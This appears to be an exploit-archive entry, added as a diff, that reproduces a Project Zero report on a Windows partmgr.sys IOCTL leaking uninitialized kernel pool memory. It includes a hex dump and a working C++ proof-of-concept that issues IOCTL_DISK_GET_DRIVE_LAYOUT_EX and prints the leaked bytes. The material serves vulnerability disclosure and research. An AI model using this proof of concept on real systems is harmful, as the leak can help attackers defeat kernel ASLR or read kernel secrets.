@@ -1,0 +1,104 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1159
+
+We have discovered that the handler of the IOCTL_DISK_GET_DRIVE_LAYOUT_EX IOCTL in partmgr.sys discloses portions of uninitialized pool memory to user-mode clients.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region. In this case, the marker byte was 0x29 (")").
+
+--- cut ---
+00000000: 00 00 00 00 04 00 00 00 ee a2 5d 9f 29 29 29 29 ..........].))))
+00000010: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000020: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000030: 00 00 00 00 29 29 29 29 00 00 10 00 00 00 00 00 ....))))........
+00000040: 00 00 40 06 00 00 00 00 01 00 00 00 00 29 29 29 ..@..........)))
+00000050: 07 01 01 29 00 08 00 00 29 29 29 29 29 29 29 29 ...)....))))))))
+00000060: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000070: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000080: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000090: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000000a0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000000b0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000000c0: 00 00 00 00 29 29 29 29 00 00 50 06 00 00 00 00 ....))))..P.....
+000000d0: 00 00 90 39 06 00 00 00 02 00 00 00 00 29 29 29 ...9.........)))
+000000e0: 07 00 01 29 00 28 03 00 29 29 29 29 29 29 29 29 ...).(..))))))))
+000000f0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000100: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000110: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000120: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000130: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000140: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000150: 00 00 00 00 29 29 29 29 00 00 00 00 00 00 00 00 ....))))........
+00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 29 29 29 .............)))
+00000170: 00 00 00 29 00 00 00 00 29 29 29 29 29 29 29 29 ...)....))))))))
+00000180: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000190: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000001a0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000001b0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000001c0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000001d0: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+000001e0: 00 00 00 00 29 29 29 29 00 00 00 00 00 00 00 00 ....))))........
+000001f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 29 29 29 .............)))
+00000200: 00 00 00 29 00 00 00 00 29 29 29 29 29 29 29 29 ...)....))))))))
+00000210: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000220: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000230: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000240: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000250: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+00000260: 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 29 ))))))))))))))))
+--- cut ---
+
+Triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Open the disk device.
+  HANDLE hDisk = CreateFile(L"\\\\.\\C:", 0, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hDisk == INVALID_HANDLE_VALUE) {
+    printf("CreateFile failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Obtain the output data, assuming that it will fit into 1024 bytes.
+  BYTE layout[1024];
+  DWORD BytesReturned;
+  if (!DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX, NULL, 0, layout, sizeof(layout), &BytesReturned, NULL)) {
+    printf("DeviceIoControl failed, %d\n", GetLastError());
+    CloseHandle(hDisk);
+    return 1;
+  }
+
+  // Dump the output data on screen and free resources.
+  PrintHex(layout, BytesReturned);
+  CloseHandle(hDisk);
+
+  return 0;
+}
